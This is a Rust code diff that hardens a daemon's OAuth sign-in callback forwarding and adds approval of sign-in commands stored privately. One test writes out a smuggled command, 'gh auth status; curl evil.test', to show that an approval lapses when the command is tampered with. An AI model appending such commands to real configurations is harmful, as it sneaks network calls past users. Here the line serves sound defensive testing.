@@ -14,6 +14,18 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 
 /// How long a callback, and the forward for it, lasts at most.
 pub const LIFETIME: Duration = Duration::from_secs(10 * 60);
+/// How long a member's relay of a sign-in waits for its end: past
+/// [`LIFETIME`], so the end of one stopped then still comes back.
+pub const RELAY_WAIT: Duration = Duration::from_secs(11 * 60);
+
+/// How long a sign-in run waits for its command to end before it stops
+/// it: [`LIFETIME`]. Tests set less.
+pub fn run_wait() -> Duration {
+    std::env::var("MOONLET_TEST_SIGNIN_WAIT_MS")
+        .ok()
+        .and_then(|v| v.parse().ok())
+        .map_or(LIFETIME, Duration::from_millis)
+}
 /// The most a request or an answer through a forward may be.
 const MAX_BYTES: usize = 1024 * 1024;
 /// How long a forwarded request waits for the command's answer.
@@ -128,18 +140,26 @@ async fn parent_of(pid: u32) -> Option<u32> {
 }
 
 /// `pid` and its ancestors, up to but not including `stop` (the daemon,
-/// which started the terminal or agent) or the first process.
+/// which started the terminal or agent); none unless `stop` is one of its
+/// ancestors, so only a process of a terminal or agent of this daemon has
+/// any.
 async fn lineage(pid: u32, stop: u32) -> Vec<u32> {
     let mut out = Vec::new();
     let mut at = pid;
-    while at > 1 && at != stop && out.len() < 64 {
+    while out.len() < 64 {
+        if at == stop {
+            return out;
+        }
+        if at <= 1 {
+            break;
+        }
         out.push(at);
         match parent_of(at).await {
             Some(p) => at = p,
             None => break,
         }
     }
-    out
+    Vec::new()
 }
 
 /// Whether one of `listening` is `caller` or an ancestor of it, below the
@@ -152,6 +172,9 @@ pub fn listens_itself(listening: &[u32], lineage: &[u32]) -> bool {
 #[derive(Debug, Clone)]
 struct Callback {
     until: Instant,
+    /// The command's processes that listened on the port when it opened
+    /// the sign-in: the callback lasts only while one of them still does.
+    pids: Vec<u32>,
     /// The secret only the Mac it is shown on has: a `tunnel.open`
     /// without it never reaches the port.
     key: String,
@@ -203,14 +226,19 @@ impl Callbacks {
             .into_iter()
             .filter(|p| *p != daemon)
             .collect();
-        if !listens_itself(&listening, &lineage) {
+        if port < 1024 || !listens_itself(&listening, &lineage) {
             return None;
         }
+        let pids = listening
+            .into_iter()
+            .filter(|p| lineage.contains(p))
+            .collect();
         let key = new_key()?;
         self.list.lock().unwrap().insert(
             port,
             Callback {
                 until: Instant::now() + LIFETIME,
+                pids,
                 key: key.clone(),
             },
         );
@@ -221,16 +249,21 @@ impl Callbacks {
     /// registered with that key, not timed out, and something still
     /// listening on it.
     pub async fn waiting(&self, port: u16, key: &str) -> bool {
-        let alive = {
+        let pids = {
             let mut list = self.list.lock().unwrap();
             list.retain(|_, c| c.until > Instant::now());
-            list.get(&port).is_some_and(|c| same_key(&c.key, key))
+            match list.get(&port) {
+                Some(c) if same_key(&c.key, key) => c.pids.clone(),
+                _ => return false,
+            }
         };
-        if alive && listening(port).await.is_empty() {
+        // The same process still listens: another that took the port since
+        // is never reached.
+        if !listening(port).await.iter().any(|p| pids.contains(p)) {
             self.list.lock().unwrap().remove(&port);
             return false;
         }
-        alive
+        true
     }
 }
 
@@ -449,13 +482,18 @@ async fn run(
     slot: Slot,
     list: std::sync::Arc<Mutex<BTreeMap<u16, Slot>>>,
 ) {
+    let done = std::sync::Arc::new(tokio::sync::Notify::new());
     loop {
         let left = slot
             .lock()
             .unwrap()
             .until
             .saturating_duration_since(Instant::now());
-        let mut stream = match tokio::time::timeout(left, accept(&v4, v6.as_ref())).await {
+        let accepted = tokio::select! {
+            a = tokio::time::timeout(left, accept(&v4, v6.as_ref())) => a,
+            _ = done.notified() => return,
+        };
+        let mut stream = match accepted {
             Ok(Ok(s)) => s,
             Ok(Err(_)) => {
                 end_if(&list, port, &slot, |_| true);
@@ -468,33 +506,36 @@ async fn run(
                 continue;
             }
         };
-        let request = match read_request(&mut stream).await {
-            Ok(r) => r,
-            Err(e) => {
-                tracing::debug!(port, "a sign-in's request: {e:#}");
-                continue;
-            }
-        };
         let (pass, shown) = {
             let t = slot.lock().unwrap();
             (t.pass.clone(), t.shown)
         };
-        match pass(request).await {
-            Ok(answer) => {
-                let _ = stream.write_all(&answer).await;
-                let _ = stream.shutdown().await;
-            }
-            Err(e) => {
-                let _ = stream
-                    .write_all(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
-                    .await;
-                if (e.code == "gone" || e.code == "forbidden")
-                    && end_if(&list, port, &slot, |t| t.shown == shown)
-                {
-                    return;
+        let (list, slot, done) = (list.clone(), slot.clone(), done.clone());
+        // Each connection on its own, and never longer than a request
+        // takes: a browser that holds one open stops nothing.
+        tokio::spawn(async move {
+            let request =
+                match tokio::time::timeout(ANSWER_TIMEOUT, read_request(&mut stream)).await {
+                    Ok(Ok(r)) => r,
+                    _ => return,
+                };
+            match pass(request).await {
+                Ok(answer) => {
+                    let _ = stream.write_all(&answer).await;
+                    let _ = stream.shutdown().await;
+                }
+                Err(e) => {
+                    let _ = stream
+                        .write_all(b"HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
+                        .await;
+                    if (e.code == "gone" || e.code == "forbidden")
+                        && end_if(&list, port, &slot, |t| t.shown == shown)
+                    {
+                        done.notify_one();
+                    }
                 }
             }
-        }
+        });
     }
 }
 
@@ -521,13 +562,162 @@ impl Taken {
     }
 }
 
+/// Sign-ins that Sign in on every member started (X75), by the member each
+/// runs on and its terminal there, with the member that started it: on a
+/// member, its own sign-ins; on the central host, those it relays, so only
+/// the Mac that started one follows its terminal or waits for its end.
+/// Each lapses a minute after its command would have been stopped.
+#[derive(Default)]
+pub struct Started {
+    list: Mutex<std::collections::HashMap<(String, u32), (String, Instant)>>,
+}
+
+impl Started {
+    /// Sign-in `terminal` on `member`, started by member `by` at `now`.
+    pub fn start(&self, member: &str, terminal: u32, by: &str, now: Instant) {
+        let mut list = self.list.lock().unwrap();
+        list.retain(|_, (_, until)| *until > now);
+        let until = now + run_wait() + Duration::from_secs(60);
+        list.insert((member.to_string(), terminal), (by.to_string(), until));
+    }
+
+    /// Who started sign-in `terminal` on `member`, while it has not lapsed
+    /// at `now`.
+    pub fn by(&self, member: &str, terminal: u32, now: Instant) -> Option<String> {
+        let list = self.list.lock().unwrap();
+        list.get(&(member.to_string(), terminal))
+            .filter(|(_, until)| *until > now)
+            .map(|(by, _)| by.clone())
+    }
+
+    /// Sign-in `terminal` on `member` ended: nobody follows it any more.
+    pub fn end(&self, member: &str, terminal: u32) {
+        self.list
+            .lock()
+            .unwrap()
+            .remove(&(member.to_string(), terminal));
+    }
+}
+
+/// The sign-in commands this member's user approved (X75), by entry id,
+/// as they were then: kept in `$MOONLET_HOME/signins.json`, mode 0600, and
+/// never synced. A command changed since, here or on another member, asks
+/// again.
+pub struct Approvals {
+    home: std::path::PathBuf,
+}
+
+/// What an approval holds of an entry: both its commands, exactly.
+fn approved_text(e: &moonlet_proto::types::SignIn) -> String {
+    format!("{}\n{}", e.login, e.check)
+}
+
+impl Approvals {
+    pub fn new(home: &std::path::Path) -> Approvals {
+        Approvals {
+            home: home.to_path_buf(),
+        }
+    }
+
+    fn read(&self) -> BTreeMap<String, String> {
+        moonlet_core::copied_files::read(&self.home, "signins.json")
+            .ok()
+            .flatten()
+            .and_then(|b| serde_json::from_slice(&b).ok())
+            .unwrap_or_default()
+    }
+
+    pub fn approved(&self, e: &moonlet_proto::types::SignIn) -> bool {
+        self.read().get(&e.id) == Some(&approved_text(e))
+    }
+
+    pub fn approve(&self, e: &moonlet_proto::types::SignIn) -> Result<()> {
+        let mut all = self.read();
+        all.insert(e.id.clone(), approved_text(e));
+        moonlet_core::copied_files::write(&self.home, "signins.json", &serde_json::to_vec(&all)?)
+    }
+}
+
+/// Whether `check` exits 0 within 10 s, run by `sh` with `env`.
+pub async fn signed_in(check: &str, env: &BTreeMap<String, String>) -> bool {
+    let run = tokio::process::Command::new("/bin/sh")
+        .args(["-c", check])
+        .env_clear()
+        .envs(env)
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::null())
+        .stderr(std::process::Stdio::null())
+        .kill_on_drop(true)
+        .status();
+    matches!(tokio::time::timeout(Duration::from_secs(10), run).await, Ok(Ok(s)) if s.success())
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
 
+    #[test]
+    fn a_started_sign_in_is_the_starters_until_it_ends_or_lapses() {
+        let started = Started::default();
+        let t0 = Instant::now();
+        started.start("build-box", 7, "MacBook", t0);
+        assert_eq!(
+            started.by("build-box", 7, t0 + Duration::from_secs(5)),
+            Some("MacBook".to_string())
+        );
+        // Another terminal, or the same id on another member, is nobody's.
+        assert_eq!(started.by("build-box", 8, t0), None);
+        assert_eq!(started.by("studio-mini", 7, t0), None);
+        // Past its command's ten minutes and a minute more, it lapses.
+        assert_eq!(
+            started.by("build-box", 7, t0 + Duration::from_secs(11 * 60 + 1)),
+            None
+        );
+        started.start("build-box", 9, "MacBook", t0);
+        started.end("build-box", 9);
+        assert_eq!(started.by("build-box", 9, t0), None);
+    }
+
     /// `lsof -nP -iTCP:8095 -sTCP:LISTEN -Fpn` with `python3 -m
     /// http.server 8095 --bind 127.0.0.1` listening (macOS 27).
     const LSOF: &str = "p85443\nf3\nn127.0.0.1:8095\n";
+
+    #[test]
+    fn a_sign_in_changed_since_it_was_approved_asks_again() {
+        let home = tempfile::tempdir().unwrap();
+        let a = Approvals::new(home.path());
+        let gh = moonlet_proto::types::SignIn {
+            id: "gh".into(),
+            name: "gh".into(),
+            login: "gh auth login --web".into(),
+            check: "gh auth status".into(),
+        };
+        assert!(!a.approved(&gh));
+        a.approve(&gh).unwrap();
+        assert!(a.approved(&gh));
+        let changed = moonlet_proto::types::SignIn {
+            check: "gh auth status; curl evil.test".into(),
+            ..gh
+        };
+        assert!(!a.approved(&changed));
+        use std::os::unix::fs::PermissionsExt;
+        assert_eq!(
+            std::fs::metadata(home.path().join("signins.json"))
+                .unwrap()
+                .permissions()
+                .mode()
+                & 0o777,
+            0o600
+        );
+    }
+
+    #[tokio::test]
+    async fn a_member_is_signed_in_when_its_check_exits_0() {
+        let env: BTreeMap<String, String> =
+            [("PATH".to_string(), "/usr/bin:/bin".to_string())].into();
+        assert!(signed_in("true", &env).await);
+        assert!(!signed_in("exit 1", &env).await);
+    }
 
     #[test]
     fn lsof_names_the_listening_process() {
@@ -697,7 +887,8 @@ srv.serve_forever()
             format!("https://id.example.test/auth?redirect_uri=http%3A%2F%2Flocalhost%3A{port}%2F");
         let callbacks = Callbacks::default();
         let me = std::process::id();
-        let (got, key) = callbacks.register_below(&url, me, 0).await.unwrap();
+        let daemon = parent_of(me).await.unwrap();
+        let (got, key) = callbacks.register_below(&url, me, daemon).await.unwrap();
         assert_eq!(got, port);
         assert!(callbacks.waiting(port, &key).await);
         assert_eq!(key.len(), 64);
@@ -720,7 +911,16 @@ srv.serve_forever()
         let url = format!(
             "https://id.example.test/auth?redirect_uri=http%3A%2F%2Flocalhost%3A{theirs}%2F"
         );
-        assert_eq!(callbacks.register_below(&url, me, 0).await, None);
+        assert_eq!(callbacks.register_below(&url, me, daemon).await, None);
+        // Nor does a process the daemon did not start.
+        let url_mine =
+            format!("https://id.example.test/auth?redirect_uri=http%3A%2F%2Flocalhost%3A{port}%2F");
+        assert_eq!(
+            Callbacks::default()
+                .register_below(&url_mine, me, 999_999)
+                .await,
+            None
+        );
         // Nor does a port of the daemon's own.
         let url =
             format!("https://id.example.test/auth?redirect_uri=http%3A%2F%2Flocalhost%3A{port}%2F");
